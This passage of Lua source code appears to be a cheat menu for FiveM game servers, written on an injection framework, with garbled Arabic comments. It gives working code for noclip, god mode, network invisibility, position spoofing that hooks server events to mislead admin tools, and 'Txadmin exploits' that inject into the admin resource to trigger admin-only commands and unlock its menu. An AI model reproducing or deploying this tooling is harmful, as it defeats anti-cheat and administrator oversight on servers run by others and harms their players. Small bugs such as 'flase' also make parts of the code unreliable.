            -- Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø³Ø±Ø¹Ø©
            if IsControlPressed(0, 21) then -- Shift Ù„Ù„Ø³Ø±Ø¹Ø©
                speed = speed * 4
            elseif IsControlPressed(0, 19) then -- Alt Ù„Ù„Ø¨Ø·Ø¡
                speed = speed * 0.3
            end

            -- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            local camRot = GetGameplayCamRot(2)
            local camHeading = camRot.z
            local camPitch = camRot.x
            
            -- ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Ø±Ø§Ø¯ÙŠØ§Ù†
            local headingRad = camHeading * 3.14159 / 180.0
            local pitchRad = camPitch * 3.14159 / 180.0
            
            -- Ø­Ø³Ø§Ø¨ Ø§Ù„Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ø«Ù„Ø§Ø«ÙŠ Ø§Ù„Ø£Ø¨Ø¹Ø§Ø¯
            local dirX = -math.sin(headingRad) * math.cos(pitchRad)
            local dirY = math.cos(headingRad) * math.cos(pitchRad)
            local dirZ = math.sin(pitchRad)

            -- Ø§Ù„Ø­Ø±ÙƒØ©
            if IsControlPressed(0, 32) then -- W Ù„Ù„Ø£Ù…Ø§Ù…
                x = x + speed * dirX
                y = y + speed * dirY
                z = z + speed * dirZ
            end

            if IsControlPressed(0, 33) then -- S Ù„Ù„Ø®Ù„Ù
                x = x - speed * dirX
                y = y - speed * dirY
                z = z - speed * dirZ
            end

            if IsControlPressed(0, 34) then -- A ÙŠØ³Ø§Ø±
                local leftX = -math.cos(headingRad)
                local leftY = -math.sin(headingRad)
                x = x + speed * leftX
                y = y + speed * leftY
            end

            if IsControlPressed(0, 35) then -- D ÙŠÙ…ÙŠÙ†
                local rightX = math.cos(headingRad)
                local rightY = math.sin(headingRad)
                x = x + speed * rightX
                y = y + speed * rightY
            end

            if IsControlPressed(0, 22) then -- Space Ù„Ù„Ø£Ø¹Ù„Ù‰
                z = z + speed
            end

            if IsControlPressed(0, 36) then -- Ctrl Ù„Ù„Ø£Ø³ÙÙ„
                z = z - speed
            end

            SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)
            
            -- Ù„Ù„Ø³ÙŠØ§Ø±Ø©: ØªÙˆØ¬ÙŠÙ‡ Ø­Ø³Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            if veh ~= 0 then
                SetEntityHeading(veh, camHeading)
                local currentRot = GetEntityRotation(veh)
                SetEntityRotation(veh, camPitch, currentRot.y, camHeading, 2, true)
            end
            
            Wait(0)
        end
    end)
end

-- Ø¯Ø§Ù„Ø© ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨
local function ActivateNoclip()
    noclip = true
    MachoMenuNotification("Noclip", "Activated - Speed: " .. noclipSpeed)
    
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    -- Ø­ÙØ¸ Ø­Ø§Ù„Ø© Ø§Ù„ØªØµØ§Ø¯Ù… Ø§Ù„Ø£ØµÙ„ÙŠØ©
    originalCollision.ped = true
    if veh ~= 0 then
        originalCollision.veh = true
    end
    
    NoclipLoop()
end

-- Ø¯Ø§Ù„Ø© Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨
local function DeactivateNoclip()
    noclip = false
    MachoMenuNotification("Noclip", "Deactivated")
    
    -- Ø¥Ø¹Ø§Ø¯Ø© ØªÙØ¹ÙŠÙ„ Ø§Ù„ØªØµØ§Ø¯Ù…
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    if originalCollision.ped then
        SetEntityCollision(ped, true, true)
    end
    if veh ~= 0 and originalCollision.veh then
        SetEntityCollision(veh, true, true)
    end
end

-- Ø§Ù„ØªØ´ÙŠÙƒ Ø¨ÙˆÙƒØ³ Ù„Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨
MachoMenuCheckbox(GeneralLeftSection, "Noclip",
    function()
        ActivateNoclip()
    end,
    function()
        DeactivateNoclip()
    end
)

-- Ø§Ù„ÙƒÙŠØ¨Ø§ÙŠÙ†Ø¯ Ù„Ù„Ø§Ø®ØªØµØ§Ø±
MachoMenuKeybind(GeneralLeftSection, "Noclip Key", 0, function(key, toggle)
    selectedKey = key
end)

-- Ù…Ø±Ø§Ù‚Ø¨Ø© Ø¶ØºØ· Ø§Ù„Ù…ÙØªØ§Ø­ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… MachoOnKeyDown
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not noclip then
            ActivateNoclip()
        else
            DeactivateNoclip()
        end
    end
end)
local radarInvisibilityLoop = false

MachoMenuCheckbox(GeneralLeftSection, "Full Invisibility [BETA]", 
   function()
       radarInvisibilityLoop = true
       MachoMenuNotification("Full Invisibility", "Activated")
       
       Citizen.CreateThread(function()
           while radarInvisibilityLoop do
               local playerPed = PlayerPedId()
               
               -- Hide from radar/minimap completely
               SetEntityVisible(playerPed, true, false) -- Keep visible to yourself
               MachoInjectResource("any",[[SetEntityVisibleToNetwork(PlayerPedId(), false)]])  -- Hide from network/other players
               
               -- Advanced radar hiding
               SetPlayerInvisibleLocally(PlayerId(), false) -- Stay visible to yourself
               SetEntityAlpha(playerPed, 255, false) -- Keep full opacity for yourself
               
               -- Hide blip and disable radar tracking
               local playerId = PlayerId()
               local playerBlip = GetBlipFromEntity(playerPed)
               if DoesBlipExist(playerBlip) then
                   SetBlipAlpha(playerBlip, 0)
                   RemoveBlip(playerBlip)
               end
               
               -- Network invisibility for admin tools
               NetworkSetEntityInvisibleToNetwork(playerPed, true)
               SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(playerPed), false)
               
               Citizen.Wait(100)
           end
           
           -- Restore visibility when disabled
           local playerPed = PlayerPedId()
           SetEntityVisible(playerPed, true, false)
           MachoInjectResource("any",[[SetEntityVisibleToNetwork(PlayerPedId(), true)]])
           SetPlayerInvisibleLocally(PlayerId(), false)
           SetEntityAlpha(playerPed, 255, false)
           NetworkSetEntityInvisibleToNetwork(playerPed, false)
           SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(playerPed), true)
       end)
   end,
   function()
       radarInvisibilityLoop = false
       MachoMenuNotification("Full Invisibility", "Deactivatedn")
   end
)


local godModeLoop = false
MachoMenuCheckbox(GeneralLeftSection, "Good Mode", 
   function()
       godModeLoop = true
       MachoMenuNotification("Good Mode", "Activated")
       
       Citizen.CreateThread(function()
           while godModeLoop do
               local playerPed = PlayerPedId()
               SetEntityInvincible(playerPed, true)
               SetPlayerInvincible(PlayerId(), true)
               SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
               SetPedArmour(playerPed, GetPlayerMaxArmour(PlayerId()))
               SetEntityCanBeDamaged(playerPed, false)
               SetEntityProofs(playerPed, true, true, true, true, true, true, true, true)
               Citizen.Wait(0)
           end
           
           local playerPed = PlayerPedId()
           SetEntityInvincible(playerPed, false)
           SetPlayerInvincible(PlayerId(), false)
           SetEntityCanBeDamaged(playerPed, true)
           SetEntityProofs(playerPed, false, false, false, false, false, false, false, false)
       end)
   end,
   function()
       godModeLoop = false
       MachoMenuNotification("Good Mode", "Deactivated")
   end
)
-- Semi God Mode

local SemiGod = false

MachoMenuCheckbox(GeneralLeftSection, "Semi God Mode", 
    function()
        SemiGod = true
        MachoMenuNotification("Semi God Mode", "Activated")
        
        Citizen.CreateThread(function()
            while SemiGod do
                local playerPed = PlayerPedId()
                
                -- Keep health above 200
                if GetEntityHealth(playerPed) < 200 then
                    SetEntityHealth(playerPed, 200)
                end
                
                Citizen.Wait(100) -- Check every 100ms
            end
        end)
    end,
    function()
        SemiGod = false
        MachoMenuNotification("Semi God Mode", "Deactivated")
    end
)

local antiTpLoop = false
local originalPosition = nil
local lastSafePosition = nil
local initializationComplete = false
local teleportCooldown = 0
MachoMenuText(GeneralLeftSection,"Antis & Spoofers")
local soloSessionLoop = false
MachoMenuButton(GeneralLeftSection, "start/stop Solo Session", function()
    if not soloSessionLoop then
        soloSessionLoop = true
        MachoMenuNotification("Solo Session", "Activated")
        NetworkStartSoloTutorialSession()
    else
        soloSessionLoop = false
        MachoMenuNotification("Solo Session", "Deactivated")
        NetworkEndTutorialSession()
    end
end)
MachoMenuButton(GeneralLeftSection, "Force Undrag", function()
MachoInjectResource("any", [[
    local playerPed = PlayerPedId()
    local playerPos = GetEntityCoords(playerPed)
    local forward = GetEntityForwardVector(playerPed)
    local spawnPos = playerPos + forward * 2.0
    local heading = GetEntityHeading(playerPed)
    local wallModel = `prop_barriercrash_01`

    -- Request model (client-side)
    RequestModel(wallModel)
    while not HasModelLoaded(wallModel) do
        Citizen.Wait(10)
    end

    -- Create invisible, non-networked wall object (client-side only)
    local wallObject = CreateObjectNoOffset(wallModel, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
    SetEntityHeading(wallObject, heading)
    PlaceObjectOnGroundProperly(wallObject)
    SetEntityAsMissionEntity(wallObject, true, true)
    FreezeEntityPosition(wallObject, true)
    SetEntityCollision(wallObject, true, true)
    SetEntityDynamic(wallObject, false)
    SetEntityInvincible(wallObject, true)
    SetEntityVisible(wallObject, false, false)

    SetModelAsNoLongerNeeded(wallModel)

    -- Force player into cover (client-side)
    ClearPedTasksImmediately(playerPed)
    SetPedConfigFlag(playerPed, 287, true)
    TaskWarpPedDirectlyIntoCover(playerPed, 1000, true, true, false, nil)

    -- Delete wall immediately (client-side)
    Citizen.Wait(100)
    if DoesEntityExist(wallObject) then
        DeleteEntity(wallObject)
    end
]])
end)
MachoMenuCheckbox(GeneralLeftSection, "Anti HS", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 34, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 34, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
MachoMenuCheckbox(GeneralLeftSection, "Anti jack", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 140, true)
           SetPedConfigFlag(PlayerPedId(), 45, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 140, false)
                SetPedConfigFlag(PlayerPedId(), 45, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
MachoMenuCheckbox(GeneralLeftSection, "Location Spoof [DESYNC MODE]", 
    function()
        enableLocationSpoof = true
        local fakeCoords = vector3(-1037.0, -2737.0, 20.0) -- Los Santos Airport

        CreateThread(function()
            while enableLocationSpoof do
                local targetResource = nil
                local resourcePriority = {"any", "any", "anya"}
                local foundResources = {}

                for _, res in ipairs(resourcePriority) do
                    if GetResourceState(res) == "started" then
                        table.insert(foundResources, res)
                    end
                end

                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    for i = 0, GetNumResources() - 1 do
                        local res = GetResourceByFindIndex(i)
                        if res and GetResourceState(res) == "started" then
                            table.insert(foundResources, res)
                        end
                    end
                    if #foundResources > 0 then
                        targetResource = foundResources[math.random(1, #foundResources)]
                    end
                end

                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local fakeX, fakeY, fakeZ = ]] .. fakeCoords.x .. [[, ]] .. fakeCoords.y .. [[, ]] .. fakeCoords.z .. [[

                        -- Save originals
                        local originalTriggerServerEvent = TriggerServerEvent
                        local originalGetEntityCoords = GetEntityCoords
                        local originalSetEntityCoordsNoOffset = SetEntityCoordsNoOffset

                        -- Override position reporting
                        TriggerServerEvent = function(eventName, ...)
                            local args = {...}
                            if string.find(eventName:lower(), "position") or string.find(eventName:lower(), "coord") or string.find(eventName:lower(), "location") then
                                for i, arg in ipairs(args) do
                                    if type(arg) == "table" and arg.x and arg.y and arg.z then
                                        args[i] = {x = fakeX, y = fakeY, z = fakeZ}
                                    end
                                end
                            end
                            return originalTriggerServerEvent(eventName, table.unpack(args))
                        end

                        -- Spoof coords to admin tools
                        GetEntityCoords = function(entity, alive)
                            if entity == PlayerPedId() then
                                return vector3(fakeX, fakeY, fakeZ)
                            end
                            return originalGetEntityCoords(entity, alive)
                        end

                        -- Desync: Force local ped to be far from server coords
                        CreateThread(function()
                            while true do
                                local ped = PlayerPedId()
                                -- Rapid micro movements around the fake location
                                local jitter = math.random(-2,2) + 0.001 * math.random()
                                local fx, fy, fz = fakeX + jitter, fakeY - jitter, fakeZ
                                originalSetEntityCoordsNoOffset(ped, fx, fy, fz, false, false, false)

                                Wait(100 + math.random(20, 80))
                            end
                        end)
                    ]])
                end

                Wait(2000)
            end
        end)
    end,
    function()
        enableLocationSpoof = false

        local targetResource = nil
        local resourcePriority = {"any", "spawnmanager", "sessionmanager"}
        for _, res in ipairs(resourcePriority) do
            if GetResourceState(res) == "started" then
                targetResource = res
                break
            end
        end

        if targetResource then
            MachoInjectResource(targetResource, [[
                -- Cleanup and restore original behavior
                collectgarbage()
            ]])
        end
    end
)

MachoMenuCheckbox(GeneralLeftSection, "Anti Teleport (Player Detection)", 
   function()
       antiTpLoop = true
       
       -- Reset everything on activation
       originalPosition = nil
       lastSafePosition = nil
       initializationComplete = false
       teleportCooldown = 0
       
       MachoMenuNotification("Anti TP", "Initializing player-based protection...")
       
       Citizen.CreateThread(function()
           -- Initialization phase
           Citizen.Wait(1000)
           local playerPed = PlayerPedId()
           originalPosition = GetEntityCoords(playerPed)
           lastSafePosition = originalPosition
           initializationComplete = true
           MachoMenuNotification("Anti TP", " Player-detection protection active")
           
           while antiTpLoop do
               Citizen.Wait(50)
               
               if initializationComplete then
                   local playerPed = PlayerPedId()
                   local playerCoords = GetEntityCoords(playerPed)
                   local currentTime = GetGameTimer()
                   
                   if originalPosition ~= nil then
                       local distance = #(playerCoords - originalPosition)
                       
                       -- Only check if cooldown has passed
                       if currentTime > teleportCooldown then
                           -- Check for suspicious teleportation (moved more than 30 meters)
                           if distance > 30.0 then
                               -- Look for nearby players at the new location
                               local nearbyPlayers = {}
                               
                               for i = 0, 255 do
                                   if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                       local otherPlayer = GetPlayerPed(i)
                                       if DoesEntityExist(otherPlayer) then
                                           local otherPos = GetEntityCoords(otherPlayer)
                                           local distanceToOther = #(playerCoords - otherPos)
                                           
                                           -- If there's a player within 1 meter of teleport destination
                                           if distanceToOther <= 1.0 then
                                               local playerName = GetPlayerName(i) or "Unknown"
                                               local playerId = GetPlayerServerId(i) or 0
                                               
                                               table.insert(nearbyPlayers, {
                                                   name = playerName,
                                                   serverId = playerId,
                                                   clientId = i,
                                                   distance = distanceToOther
                                               })
                                           end
                                       end
                                   end
                               end
                               
                               -- If there are nearby players, it's likely a malicious teleport
                               if #nearbyPlayers > 0 then
                                   -- Use last safe position instead of original
                                   local safePos = lastSafePosition or originalPosition
                                   
                                   -- Ensure safe position is valid
                                   if safePos and safePos.x and safePos.y and safePos.z then
                                       SetEntityCoords(playerPed, safePos.x, safePos.y, safePos.z, false, false, false, true)
                                       SetEntityVelocity(playerPed, 0.0, 0.0, 0.0)
                                       
                                       -- Set cooldown to prevent spam
                                       teleportCooldown = currentTime + 1000
                                       
                                       -- Send detailed notification
                                       for _, player in ipairs(nearbyPlayers) do
                                           MachoMenuNotification(" TELEPORT BLOCKED", 
                                               string.format("Player: %s | ID: %d | Server ID: %d", 
                                               player.name, player.clientId, player.serverId))
                                           break -- Show only first player to avoid spam
                                       end
                                       
                                       -- Don't update originalPosition after teleport block
                                       Citizen.Wait(500)
                                       originalPosition = GetEntityCoords(playerPed)
                                   end
                               else
                                   -- Check for other suspicious activity
                                   local currentVelocity = GetEntityVelocity(playerPed)
                                   local actualSpeed = #currentVelocity
                                   local vehicle = GetVehiclePedIsIn(playerPed, false)
                                   local interiorId = GetInteriorFromEntity(playerPed)
                                   
                                   -- Allow legitimate teleports (interiors, vehicles, etc.)
                                   if interiorId ~= 0 or vehicle ~= 0 or actualSpeed > 5.0 then
                                       -- Legitimate teleport - update positions
                                       originalPosition = playerCoords
                                       lastSafePosition = playerCoords
                                   elseif distance > 100.0 then
                                       -- Very suspicious teleport - block it
                                       local safePos = lastSafePosition or originalPosition
                                       if safePos and safePos.x and safePos.y and safePos.z then
                                           SetEntityCoords(playerPed, safePos.x, safePos.y, safePos.z, false, false, false, true)
                                           teleportCooldown = currentTime + 1000
                                           MachoMenuNotification(" SUSPICIOUS TELEPORT", "Blocked long-distance teleport")
                                           Citizen.Wait(500)
                                           originalPosition = GetEntityCoords(playerPed)
                                       end
                                   else
                                       -- Allow and update
                                       originalPosition = playerCoords
                                       lastSafePosition = playerCoords
                                   end
                               end
                           else
                               -- Normal movement - update positions
                               originalPosition = playerCoords
                               
                               -- Update safe position only for short distances
                               if distance < 15.0 then
                                   lastSafePosition = playerCoords
                               end
                           end
                       else
                           -- During cooldown, just update original position for next check
                           originalPosition = playerCoords
                       end
                   else
                       -- Initialize position
                       originalPosition = playerCoords
                       lastSafePosition = playerCoords
                   end
               end
           end
       end)
   end,
   function()
       antiTpLoop = false
       originalPosition = nil
       lastSafePosition = nil
       initializationComplete = false
       teleportCooldown = 0
       MachoMenuNotification("Anti TP", "Deactivated")
   end
)

local autoResetLoop = false

MachoMenuCheckbox(GeneralLeftSection, "Auto Reset", 
   function()
       autoResetLoop = true
       MachoMenuNotification("Auto Reset", "Activated - Character resets every 0.1 seconds")
       
       Citizen.CreateThread(function()
           while autoResetLoop do
               local playerPed = PlayerPedId()
               
               -- Reset character health and states without affecting camera
               SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
               SetPedArmour(playerPed, GetPlayerMaxArmour(PlayerId()))
               
               -- Clear all damage and effects
               ClearPedBloodDamage(playerPed)
               ClearPedWetness(playerPed)
               ClearPedEnvDirt(playerPed)
               ClearPedDamageDecalByZone(playerPed, 0, "ALL")
               ClearPedDamageDecalByZone(playerPed, 1, "ALL")
               ClearPedDamageDecalByZone(playerPed, 2, "ALL")
               ClearPedDamageDecalByZone(playerPed, 3, "ALL")
               ClearPedDamageDecalByZone(playerPed, 4, "ALL")
               ClearPedDamageDecalByZone(playerPed, 5, "ALL")
               
               -- Reset animation and movement states
               if not IsPedInAnyVehicle(playerPed, false) then
                   ClearPedTasks(playerPed)
                   ClearPedSecondaryTask(playerPed)
               end
               
               -- Reset facial expressions and emotions
               ClearFacialIdleAnimOverride(playerPed)
               
               -- Reset any stuck states
               SetPedCanRagdoll(playerPed, true)
               SetPedCanRagdoll(playerPed, false)
               
               -- Reset stamina
               RestorePlayerStamina(PlayerId(), 1.0)
               
               Citizen.Wait(100) -- 0.1 seconds = 100ms
           end
       end)
   end,
   function()
       autoResetLoop = false
       MachoMenuNotification("Auto Reset", "Deactivated - Auto reset stopped")
   end
)
local antiCarryLoop = false
local lastFreePosition = nil

MachoMenuCheckbox(GeneralLeftSection, "Anti Carry & Drag", 
   function()
       antiCarryLoop = true
       local playerPed = PlayerPedId()
       lastFreePosition = GetEntityCoords(playerPed)
       MachoMenuNotification("Anti Carry & Drag", "Activated - Protected from being carried")
       
       Citizen.CreateThread(function()
           while antiCarryLoop do
               local playerPed = PlayerPedId()
               
               -- Check if player is being carried or attached
               if IsEntityAttached(playerPed) then
                   -- Get who is carrying/attached to
                   local attachedTo = GetEntityAttachedTo(playerPed)
                   
                   if DoesEntityExist(attachedTo) then
                       -- Check if attached to another player
                       local isAttachedToPlayer = false
                       local carrierInfo = "Unknown"
                       
                       for i = 0, 255 do
                           if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                               local otherPlayerPed = GetPlayerPed(i)
                               if otherPlayerPed == attachedTo then
                                   isAttachedToPlayer = true
                                   local playerName = GetPlayerName(i) or "Unknown"
                                   local serverId = GetPlayerServerId(i) or 0
                                   carrierInfo = string.format("%s (ID: %d, Server: %d)", playerName, i, serverId)
                                   break
                               end
                           end
                       end
                       
                       -- Detach from player carries
                       if isAttachedToPlayer then
                           DetachEntity(playerPed, true, true)
                           
                           -- Return to last safe position
                           if lastFreePosition then
                               SetEntityCoords(playerPed, lastFreePosition.x, lastFreePosition.y, lastFreePosition.z, false, false, false, true)
                           end
                           
                           -- Clear any carry animations
                           ClearPedTasks(playerPed)
                           ClearPedSecondaryTask(playerPed)
                           
                           MachoMenuNotification(" Carry & Drag BLOCKED", 
                               string.format("Prevented Carry & Drag by: %s", carrierInfo))
                       end
                   end
               else
                   -- Not attached - update safe position
                   local currentPos = GetEntityCoords(playerPed)
                   
                   -- Only update if player is not in a weird state
                   if not IsPedRagdoll(playerPed) and not IsPedBeingStunned(playerPed) then
                       lastFreePosition = currentPos
                   end
               end
               
               -- Also prevent pickup animations
               if IsPedBeingStunned(playerPed, 0) then
                   SetPedToRagdoll(playerPed, 1, 1, 0, 0, 0, 0)
                   ClearPedTasks(playerPed)
               end
               
               -- Prevent being grabbed
               if GetPedConfigFlag(playerPed, 292, true) then -- PED_CONFIG_FLAG_DisableMelee
                   SetPedConfigFlag(playerPed, 292, false)
               end
               
               Citizen.Wait(100)
           end
       end)
   end,
   function()
       antiCarryLoop = false
       lastFreePosition = nil
       MachoMenuNotification("Anti Carry & Drag", "Deactivated")
   end
)
MachoMenuText(GeneralLeftSection,"Txadmin exploits")


    MachoMenuButton(GeneralLeftSection, "Check Txadmin", function()
    local resourceState = GetResourceState("monitor")
    if resourceState == "started" or resourceState == "starting" then
        MachoMenuNotification("Txadmin Found", "sucsess")
    else
        MachoMenuNotification("Txadmin Not Found", "Faild")
    end
    end)

    MachoMenuButton(GeneralLeftSection, "Tp to Waypoint", function()
        MachoInjectResource('monitor', [[TriggerEvent("txcl:tpToWaypoint")]])
        MachoMenuNotification("sucsess", "TxAdmin TPW")
    end)
    MachoMenuButton(GeneralLeftSection, "Txadmin heal", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:heal')]])
        MachoMenuNotification("sucsess", "Txadmin heal")
    end)

    MachoMenuButton(GeneralLeftSection, "Vehicle boost", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:vehicle:boost')]])
        MachoMenuNotification("sucsess", "Vehicle boost")
    end)
    MachoMenuButton(GeneralLeftSection, "Vehicle fix", function()
        MachoInjectResource('monitor', [[TriggerEvent('txcl:vehicle:fix')]])
        MachoMenuNotification("sucsess", "Vehicle fix")
    end)
    MachoMenuButton(GeneralLeftSection, "Txadmin menu client side acc", function()
    MachoInjectResource('monitor', [[menuIsAccessible = true]])
    MachoMenuNotification("Menu Access", "TxAdmin menu access Activated")
    end)
    local selectedKey = 0
    MachoMenuKeybind(GeneralLeftSection, "Tp to Waypoint Key", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
         MachoInjectResource('monitor', [[TriggerEvent("txcl:tpToWaypoint")]])
        MachoMenuNotification("sucsess", "TxAdmin TPW")
        end
    end)
    MachoMenuCheckbox(GeneralLeftSection, "Show Player IDs", 
        function()
            isPlayerIdsEnabled = true
            startPlayerIdThread()
        end,
        function()
            isPlayerIdsEnabled = false
        end
    )

    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Superjump", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'superjump', true)]])
            MachoMenuNotification("Superjump", "Superjump Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Superjump", "Superjump Deactivated")
        end
    )
    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Noclip", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'noclip', true)]])
            MachoMenuNotification("Noclip", "Noclip Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Noclip", "Noclip Deactivated")
        end
    )
    local selectedKey = 0
    local nocliptx = flase
    MachoMenuKeybind(GeneralLeftSection, "Txadmin Noclip Key", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
            if not nocliptx then
                nocliptx = true
                MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'noclip', true)]])
                MachoMenuNotification("Txadmin Noclip", "Txadmin Noclip activated")
            else
                nocliptx = false
                MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
                MachoMenuNotification("Txadmin Noclip", "Txadmin Noclip deactivate")
            end
        end
    end)

    MachoMenuCheckbox(GeneralLeftSection, "Txadmin Goodmode", 
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'godmode', true)]])
            MachoMenuNotification("Godmode", "Godmode Activated")
        end,
        function()
            MachoInjectResource('monitor', [[TriggerEvent('txcl:setPlayerMode', 'none', nil)]])
            MachoMenuNotification("Godmode", "Godmode Deactivated")
        end
    )
    local GeneralRightTop = MachoMenuGroup(GeneralTab, "free cam", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap, 
        MenuSize.x - 5, 5 + MachoPaneGap + RightSectionHeight)

         MachoMenuText(GeneralRightTop,"i will add it")
    local glovalGeneralRightBottom = MachoMenuGroup(GeneralTab, "Movments", 
        TabsBarWidth + LeftSectionWidth + 10, 5 + MachoPaneGap + RightSectionHeight + 5, 
        MenuSize.x - 5, MenuSize.y - 5)
isNoclipEnabled = false
noclipSpeed = 1.0
local pendingNoclipSpeed = 1.0
local lastSliderValue = 10
local lastSliderUpdate = 0
local speedChangePending = false
local speedChangeTimer = 0

local noclipSpeedSliderValue = 10
local NoClipSpeedSlider = MachoMenuSlider(glovalGeneralRightBottom, "SkyDive", 10, 1, 500, "%", 0, function(Value)
    local currentTime = GetGameTimer()
    if Value ~= lastSliderValue and currentTime - lastSliderUpdate >= 100 then
        noclipSpeedSliderValue = Value
        pendingNoclipSpeed = Value / 10
        lastSliderValue = Value
        lastSliderUpdate = currentTime
        speedChangePending = true
        speedChangeTimer = currentTime
    end
end)

MachoMenuCheckbox(glovalGeneralRightBottom, "SkyDive", 
    function()
        isNoclipEnabled = true
        local me = PlayerPedId()
        TaskSkyDive(me)
        MachoMenuNotification("SkyDive", "SkyDive activated")
    end,
    function()
        isNoclipEnabled = false
        local me = PlayerPedId()
        ClearPedTasks(me)
        MachoMenuNotification("SkyDive", "SkyDive deactivate")
    end

)
local selectedKey = 0

MachoMenuKeybind(glovalGeneralRightBottom, "SkyDive Key", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        if not isNoclipEnabled then
            isNoclipEnabled = true
            local me = PlayerPedId()
            TaskSkyDive(me)
            MachoMenuNotification("SkyDive", "SkyDive activated")
        else
            isNoclipEnabled = false
            local me = PlayerPedId()
            ClearPedTasks(me)
            MachoMenuNotification("SkyDive", "SkyDive deactivate")
        end
    end
end)

